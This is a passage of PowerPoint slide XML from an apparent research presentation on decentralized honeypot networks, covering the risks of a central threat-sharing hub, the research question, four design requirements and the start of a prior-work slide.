          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="2194560"/>
            <a:ext cx="2103120" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Central hub</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MISP, STIX/TAXII</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="hub caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4069080"/>
            <a:ext cx="3657600" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every sensor sends raw data; the hub does all the matching.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="risk 1 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1417320"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="risk 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="1417320"/>
            <a:ext cx="3337560" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Single point of trust</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Everyone must believe the hub never loses, alters or hides data.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="risk rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="2377440"/>
            <a:ext cx="3931920" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="risk 2 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="2468880"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="risk 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="2468880"/>
            <a:ext cx="3337560" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Single point of failure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If the hub goes down, correlation stops.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="risk rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3429000"/>
            <a:ext cx="3931920" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="risk 3 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3520440"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="risk 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="3520440"/>
            <a:ext cx="3337560" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Single target</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Compromise one host and the whole sensor network goes blind.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>THE PROBLEM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The problem we solve</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="question panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="8046720" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="research question"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1371600"/>
            <a:ext cx="7589520" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Can honeypots run by organizations that don't trust each other spot shared attacks without any central server?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="requirements label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2697480"/>
            <a:ext cx="8046720" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR FOUR REQUIREMENTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="No middleman icon" descr="No middleman">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3063240"/>
            <a:ext cx="347472" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="requirement 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3520440"/>
            <a:ext cx="1783080" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No middleman</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No server anyone must trust or keep online.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="requirement rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2487168" y="3063240"/>
            <a:ext cx="9144" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Join anytime icon" descr="Join anytime">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="3063240"/>
            <a:ext cx="347472" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="requirement 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="3520440"/>
            <a:ext cx="1783080" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Join anytime</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A new honeypot catches up from shared history alone.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="requirement rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4544568" y="3063240"/>
            <a:ext cx="9144" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Resist cheating icon" descr="Resist cheating">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3063240"/>
            <a:ext cx="347472" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="requirement 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3520440"/>
            <a:ext cx="1783080" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Resist cheating</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fake or copied reports must not count as evidence.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="requirement rule 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6601968" y="3063240"/>
            <a:ext cx="9144" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Measured cost icon" descr="Measured cost">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3063240"/>
            <a:ext cx="347472" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="requirement 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3520440"/>
            <a:ext cx="1783080" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Measured cost</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Speed, fees and accuracy measured, not assumed.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PRIOR WORK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What others have built</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="central heading"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Central platforms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
